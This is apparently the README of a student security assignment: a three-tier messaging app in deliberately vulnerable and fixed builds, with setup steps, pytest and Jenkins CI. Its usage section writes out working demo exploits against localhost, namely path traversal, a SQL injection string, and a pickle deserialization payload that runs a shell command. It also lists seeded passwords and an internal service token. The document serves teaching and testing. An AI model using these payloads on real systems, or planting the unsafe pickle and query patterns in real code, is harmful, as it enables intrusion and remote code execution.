# Messaging Application

A small multi-tier messaging application built for Assignment 1. 
Users send private messages, export their chat history, and
(admins) import chat backups. The project ships in two versions: a
deliberately **vulnerable** build and a **fixed** build.

## 1. Overview

The system protects messages owned by individual users. It enforces
authentication (session tokens) and role-based authorization (ordinary
*Operator* vs. privileged *Admin*) across three independently running services
that communicate only over HTTP.

Functionalities:

1. **Send message**: an authenticated user sends a message to a recipient.
2. **Export chat history**: an authenticated user exports their own messages to
   Markdown (spans all three components, uses the external `chat_formatter`).
3. **Import chat backup**: *Admin-only* restore of a backup (spans all three
   components).
4. **Supporting operation**: View Terms of Service / Privacy Policy. Any caller downloads static public documents.

## 2. Repository Layout

| Path | Contents |
| :--- | :--- |
| [`code_vulnerable/`](code_vulnerable/) | The codebase with the planted vulnerabilities. |
| [`code_fixed/`](code_fixed/) | The codebase with the planted vulnerabilities fixed. |
| [`tests/`](tests/) | pytest suite: `functional`, `authorization`, `security`. |
| [`Jenkinsfile`](Jenkinsfile) | CI pipeline (static + dependency analysis, build, tests). |
| [`ci-evidence/`](ci-evidence/) | Archived console logs and analysis/test reports from CI runs. |
| [`docs/Plan.md`](docs/Plan.md) | SSDLC lifecycle plan, threat model (STRIDE), access-control matrix. |
| [`docs/report.pdf`](docs/report.pdf) | Written report: full design discussion, vulnerability documentation, production-release considerations. |

## 3. Architecture

| Component | Port | Responsibility |
| :--- | :--- | :--- |
| **Application API** | 8000 | Authenticates users, issues/validates session tokens, enforces roles, coordinates requests. The only user-facing component. |
| **Processing Worker** | 8002 | Runs the export/import jobs using the external `chat_formatter` package. |
| **Message Vault** | 8001 | Owns the message records and enforces access on each read/write. |

Data flows:

- **Send message:** `User → Application API → Message Vault` (stored).
- **Export chat history:** `User → Application API → Processing Worker → Message Vault → chat_formatter → back to the user`.
- **Import chat backup:** `User (Admin) → Application API → Processing Worker → Message Vault` (each message written).
- **View document (ToS / Privacy):** `User → Application API` (static file served directly).

## 4. Seeded Accounts

| Username | Password | Role |
| :--- | :--- | :--- |
| `pilot1` | `Drone@123` | Operator |
| `pilot2` | `Drone@456` | Operator |
| `admin`  | `Admin@123` | Admin |

## 5. Security / Vulnerabilities

The `code_vulnerable/` build contains four planted vulnerabilities:

| # | Type | Vulnerability |
| :--- | :--- | :--- |
| 1 | Catalog | **CWE-22** Path Traversal (Application API) |
| 2 | Catalog | **CWE-89** SQL Injection (Message Vault) |
| 3 | Catalog | **CWE-502** Deserialization of Untrusted Data (Processing Worker) |
| 4 | Composition | Missing cross-tier authorization / implicit trust (any caller can reach the Worker/Vault directly) |

Each is remediated in `code_fixed/`. Full documentation, impact, and fixes are
in the [report](docs/report.pdf).

## 6. Prerequisites

- **git**: to clone the repository.
- **Docker** and the **`docker compose` v2** plugin: to build and run the stack.
- **Python 3.x** with `pytest` and `requests`: only to run the test client,
  which talks to the running stack over HTTP 
  
Install on Debian/Ubuntu:

```bash
sudo apt update

# git + Docker + Compose v2
sudo apt install -y git docker.io docker-compose-v2
sudo usermod -aG docker "$USER"
newgrp docker

# Python + venv for the test client
sudo apt install -y python3 python3-venv
```

The Python test dependencies (`pytest`, `requests`) are installed into a
virtualenv in Section 9.

## 7. Build & Run

From the version you want to run:

```bash
cd code_fixed          # or: cd code_vulnerable
docker compose up --build
```

This builds the three images and starts the stack. The databases are created
and the accounts are seeded automatically on startup (no registration), and
reset on each fresh `up`. The Application API is then available at
`http://localhost:8000`.

## 8. Usage

The snippets below log in, capture the session token in a variable, and reuse it on the following calls.

### General functionality

```bash
API=http://localhost:8000

# Log in and capture tokens
PILOT1=$(curl -s -X POST $API/login -H 'Content-Type: application/json' \
  -d '{"username":"pilot1","password":"Drone@123"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

ADMIN=$(curl -s -X POST $API/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Admin@123"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

# Send a message (pilot1 -> pilot2)
curl -s -X POST $API/messages -H "Authorization: $PILOT1" \
  -H 'Content-Type: application/json' \
  -d '{"recipient":"pilot2","text":"hello from pilot1"}'

# Log in as pilot2 and export his chat history
PILOT2=$(curl -s -X POST $API/login -H 'Content-Type: application/json' \
  -d '{"username":"pilot2","password":"Drone@456"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

curl -s -X POST $API/export -H "Authorization: $PILOT2" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["exported_data"])'

# View the public documents
curl -s "$API/download?filename=tos.txt"
curl -s "$API/download?filename=privacy.txt"

```

### Admin only: import a backup (differs by version)

The fixed build expects JSON, the vulnerable build deserializes it with pickle. Both reuse the `$ADMIN` token from the block above.

**Vulnerable** version (`code_vulnerable`, pickle):

```bash
BACKUP=$(python3 -c 'import base64,pickle; print(base64.b64encode(pickle.dumps([{"sender":"admin","recipient":"pilot1","content":"restored"}])).decode())')
curl -s -X POST $API/import -H "Authorization: $ADMIN" \
  -H 'Content-Type: application/json' \
  -d "{\"backup\":\"$BACKUP\"}"
```

**Fixed** version (`code_fixed`, JSON):

```bash
BACKUP=$(python3 -c 'import base64,json; print(base64.b64encode(json.dumps([{"sender":"admin","recipient":"pilot1","content":"restored"}]).encode()).decode())')
curl -s -X POST $API/import -H "Authorization: $ADMIN" \
  -H 'Content-Type: application/json' \
  -d "{\"backup\":\"$BACKUP\"}"
```

### CWE-22: Path Traversal

**Vulnerable** version (`code_vulnerable`):

```bash
# Escapes the documents directory and returns the API's own source code
curl -s "$API/download?filename=../main.py"
```

**Fixed** version (`code_fixed`):

```bash
# Blocked: Invalid file path
curl -s "$API/download?filename=../main.py"
```

### CWE-89: SQL Injection (direct Vault call. Decoded recipient payload: `' OR '1'='1`)

**Vulnerable** version (`code_vulnerable`):

```bash
# No auth on the vulnerable Vault; the injection returns EVERY message
curl -s "http://localhost:8001/messages/%27%20OR%20%271%27%3D%271"
```

**Fixed** version (`code_fixed`):

```bash
# Authorized with the internal token so it reaches the query
# the payload is treated as a literal recipient -> no rows returned
curl -s -H "X-Internal-Token: adfms-internal-service-secret" \
  "http://localhost:8001/messages/%27%20OR%20%271%27%3D%271"
```

### CWE-502: Deserialization / Remote Code Execution

**Vulnerable** version (`code_vulnerable`):

```bash
PAYLOAD=$(python3 -c "import base64,pickle,os; E=type('E',(),{'__reduce__':lambda s:(os.system,('touch /tmp/pwned_demo',))}); print(base64.b64encode(pickle.dumps(E())).decode())")
curl -s -X POST $API/import -H "Authorization: $ADMIN" -H 'Content-Type: application/json' -d "{\"backup\":\"$PAYLOAD\"}"
# Confirm the injected command ran inside the Worker container.
# NOTE: run from the code_vulnerable/ folder:
docker compose exec processing_worker ls -l /tmp/pwned_demo     # file exists -> code executed
```

**Fixed** version (`code_fixed`):

```bash
PAYLOAD=$(python3 -c "import base64,pickle,os; E=type('E',(),{'__reduce__':lambda s:(os.system,('touch /tmp/pwned_demo',))}); print(base64.b64encode(pickle.dumps(E())).decode())")
curl -s -X POST $API/import -H "Authorization: $ADMIN" -H 'Content-Type: application/json' -d "{\"backup\":\"$PAYLOAD\"}"
# NOTE: run from the code_fixed/ folder:
docker compose exec processing_worker ls -l /tmp/pwned_demo     # no such file -> no code executed
```

### Composition / CWE-862: Missing cross-tier authorization

**Vulnerable** version (`code_vulnerable`):

```bash
# Direct, unauthenticated read of another user's inbox succeeds
curl -s http://localhost:8001/messages/pilot2
```

On the **fixed** version:

```bash
# Blocked (the Vault requires the internal service token)
curl -s http://localhost:8001/messages/pilot2
```

## 9. Testing

The suite runs against a running stack over HTTP. Start the stack (Section 7),
then from the repository root:

```bash
python3 -m venv .venv && source .venv/bin/activate   
pip install pytest requests

# BACKUP_FORMAT must match the running build: json for code_fixed, pickle for code_vulnerable
BACKUP_FORMAT=json pytest tests/ -v
```

- Against `code_fixed`: all functional, authorization, and security tests pass.
- Against `code_vulnerable`: the security tests fail (the exploits succeed)

## 10. CI / Pipeline

On each run, static analysis (Bandit), dependency
analysis (pip-audit), building the Docker images, and running the test suite against
the container stack, archiving all reports is performed.

### Starting Jenkins

Jenkins is reached in the browser on
`http://localhost:8080`:

```bash
# Prerequisites: Java 21, plus git/curl and Docker (see Section 6)
sudo apt install -y openjdk-21-jre

# Download Jenkins and start it
curl -L -o jenkins.war https://get.jenkins.io/war-stable/latest/jenkins.war
java -jar jenkins.war --httpPort=8080
```

Leave that process running and open **`http://localhost:8080`**. On first start, unlock Jenkins with the initial admin password:

```bash
cat ~/.jenkins/secrets/initialAdminPassword
```

Install the suggested plugins, create an admin user, then create a **Pipeline**
job with *Pipeline script from SCM* → Git, this repository's URL, branch
`*/main`, and script path `Jenkinsfile`.

### Parameters

- **`TARGET_DIR`**: `code_vulnerable` or `code_fixed`.
- **`BANDIT_SEVERITY` / `BANDIT_CONFIDENCE`**: the Bandit threshold that blocks the build.
- **`FAIL_ON_DEP_VULNS`**: whether vulnerable dependencies block the build.

### Expected results

- **`code_vulnerable`**: fails at the static-analysis gate (Bandit catches the
  planted flaws)
- **`code_fixed`**: run it with **`FAIL_ON_DEP_VULNS` unchecked**. The fixed code
  clears the static-analysis gate and passes all tests, but pip-audit still
  reports advisories against the pinned framework versions. With that box
  checked the dependency gate blocks the build, so it must be **deactivated** for
  the `code_fixed` run to succeed.